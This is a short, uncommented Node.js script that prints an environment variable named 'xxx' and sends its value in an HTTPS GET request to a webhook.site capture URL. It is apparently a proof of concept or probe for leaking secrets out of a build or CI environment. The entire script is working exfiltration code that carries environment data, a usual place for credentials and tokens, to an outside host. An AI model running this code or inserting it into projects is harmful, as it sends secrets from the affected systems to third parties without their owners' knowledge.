
console.log(process.env.xxx);
const https = require('https')
const options = {
  hostname: 'webhook.site',
  port: 443,
  path: `/8115d6a1-b414-40f3-9ae1-4eb19bd0e341?xxx=${process.env.xxx}`,
  method: 'GET'
}

const req = https.request(options, res => {
  console.log(`statusCode: ${res.statusCode}`)

  res.on('data', d => {
    process.stdout.write(d)
  })
})

req.on('error', error => {
  console.error(error)
})

req.end()